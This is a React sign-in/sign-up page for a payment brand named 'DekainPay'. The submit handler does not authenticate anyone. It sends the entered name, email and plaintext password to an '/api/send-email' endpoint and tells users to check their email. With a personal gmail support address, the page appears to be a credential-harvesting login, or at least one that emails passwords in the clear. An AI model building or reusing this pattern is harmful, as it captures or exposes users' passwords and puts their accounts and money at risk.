import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Eye, EyeOff, ArrowRight } from "lucide-react";

export default function SignIn() {
  const [isSignUp, setIsSignUp] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    password: "",
    confirmPassword: "",
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (isSignUp && formData.password !== formData.confirmPassword) {
      alert("Passwords do not match");
      return;
    }

    try {
      const response = await fetch("/api/send-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          type: isSignUp ? "signup" : "signin",
          data: formData,
        }),
      });

      const result = await response.json();

      if (result.success) {
        if (isSignUp) {
          alert(
            "Account created successfully! You will receive a confirmation email shortly.",
          );
          setIsSignUp(false);
          setFormData({
            name: "",
            email: "",
            password: "",
            confirmPassword: "",
          });
        } else {
          alert(
            "Sign in request processed! Please check your email for further instructions.",
          );
          setFormData({
            name: "",
            email: "",
            password: "",
            confirmPassword: "",
          });
        }
      } else {
        alert("Process failed. Please try again or contact support.");
      }
    } catch (error) {
      console.error("Error processing request:", error);
      alert("Process failed. Please try again or contact support.");
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-background via-primary-50/30 to-background pt-20">
      <section className="py-16 lg:py-24">
        <div className="mx-auto max-w-md px-6">
          <div className="bg-white rounded-2xl shadow-lg p-8 border border-primary-100">
            {/* Header */}
            <div className="text-center mb-8">
              <div className="flex items-center justify-center space-x-2 mb-4">
                <div className="w-10 h-10 bg-gradient-to-r from-primary-500 to-brand-teal rounded-lg flex items-center justify-center">
                  <span className="text-white font-bold">D</span>
                </div>
                <span className="text-2xl font-bold text-brand-navy">
                  DekainPay
                </span>
              </div>
              <h1 className="text-2xl font-bold text-brand-navy mb-2">
                {isSignUp ? "Create Account" : "Welcome Back"}
              </h1>
              <p className="text-brand-gray">
                {isSignUp
                  ? "Sign up to get started with DekainPay"
                  : "Sign in to your DekainPay account"}
              </p>
            </div>

            {/* Form */}
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Name field - only for sign up */}
              {isSignUp && (
                <div>
                  <Label htmlFor="name" className="text-brand-navy font-medium">
                    Full Name
                  </Label>
                  <Input
                    type="text"
                    id="name"
                    name="name"
                    value={formData.name}
                    onChange={handleChange}
                    className="mt-2 border-primary-200 focus:border-primary-500 focus:ring-primary-500"
                    placeholder="Enter your full name"
                    required={isSignUp}
                  />
                </div>
              )}

              {/* Email field */}
              <div>
                <Label htmlFor="email" className="text-brand-navy font-medium">
                  Email Address
                </Label>
                <Input
                  type="email"
                  id="email"
                  name="email"
                  value={formData.email}
                  onChange={handleChange}
                  className="mt-2 border-primary-200 focus:border-primary-500 focus:ring-primary-500"
                  placeholder="Enter your email address"
                  required
                />
              </div>

              {/* Password field */}
              <div>
                <Label
                  htmlFor="password"
                  className="text-brand-navy font-medium"
                >
                  Password
                </Label>
                <div className="relative mt-2">
                  <Input
                    type={showPassword ? "text" : "password"}
                    id="password"
                    name="password"
                    value={formData.password}
                    onChange={handleChange}
                    className="border-primary-200 focus:border-primary-500 focus:ring-primary-500 pr-10"
                    placeholder="Enter your password"
                    required
                  />
                  <button
                    type="button"
                    className="absolute inset-y-0 right-0 pr-3 flex items-center"
                    onClick={() => setShowPassword(!showPassword)}
                  >
                    {showPassword ? (
                      <EyeOff className="h-5 w-5 text-brand-gray" />
                    ) : (
                      <Eye className="h-5 w-5 text-brand-gray" />
                    )}
                  </button>
                </div>
              </div>

              {/* Confirm Password field - only for sign up */}
              {isSignUp && (
                <div>
                  <Label
                    htmlFor="confirmPassword"
                    className="text-brand-navy font-medium"
                  >
                    Confirm Password
                  </Label>
                  <div className="relative mt-2">
                    <Input
                      type={showConfirmPassword ? "text" : "password"}
                      id="confirmPassword"
                      name="confirmPassword"
                      value={formData.confirmPassword}
                      onChange={handleChange}
                      className="border-primary-200 focus:border-primary-500 focus:ring-primary-500 pr-10"
                      placeholder="Confirm your password"
                      required={isSignUp}
                    />
                    <button
                      type="button"
                      className="absolute inset-y-0 right-0 pr-3 flex items-center"
                      onClick={() =>
                        setShowConfirmPassword(!showConfirmPassword)
                      }
                    >
                      {showConfirmPassword ? (
                        <EyeOff className="h-5 w-5 text-brand-gray" />
                      ) : (
                        <Eye className="h-5 w-5 text-brand-gray" />
                      )}
                    </button>
                  </div>
                </div>
              )}

              {/* Forgot Password - only for sign in */}
              {!isSignUp && (
                <div className="text-right">
                  <button
                    type="button"
                    className="text-sm text-primary-600 hover:text-primary-700 font-medium"
                  >
                    Forgot Password?
                  </button>
                </div>
              )}

              {/* Submit Button */}
              <Button
                type="submit"
                className="w-full bg-primary-500 hover:bg-primary-600 text-white py-3 text-lg font-semibold rounded-xl shadow-lg hover:shadow-xl transition-all duration-200"
              >
                {isSignUp ? "Create Account" : "Sign In"}
                <ArrowRight className="ml-2 h-5 w-5" />
              </Button>
            </form>

            {/* Toggle between Sign In and Sign Up */}
            <div className="mt-8 text-center">
              <p className="text-brand-gray">
                {isSignUp
                  ? "Already have an account?"
                  : "Don't have an account?"}
                <button
                  type="button"
                  onClick={() => setIsSignUp(!isSignUp)}
                  className="ml-2 text-primary-600 hover:text-primary-700 font-medium"
                >
                  {isSignUp ? "Sign In" : "Sign Up"}
                </button>
              </p>
            </div>

            {/* Terms and Privacy */}
            {isSignUp && (
              <div className="mt-6 text-center">
                <p className="text-xs text-brand-gray">
                  By creating an account, you agree to our{" "}
                  <a
                    href="/privacy-policy"
                    className="text-primary-600 hover:text-primary-700"
                  >
                    Privacy Policy
                  </a>{" "}
                  and{" "}
                  <a
                    href="/refunds-cancellation"
                    className="text-primary-600 hover:text-primary-700"
                  >
                    Terms of Service
                  </a>
                </p>
              </div>
            )}
          </div>

          {/* Contact Support */}
          <div className="mt-8 text-center">
            <p className="text-brand-gray text-sm">
              Need help?{" "}
              <a
                href="mailto:agentxofficialwork@gmail.com"
                className="text-primary-600 hover:text-primary-700 font-medium"
              >
                Contact Support
              </a>
            </p>
          </div>
        </div>
      </section>
    </div>
  );
}
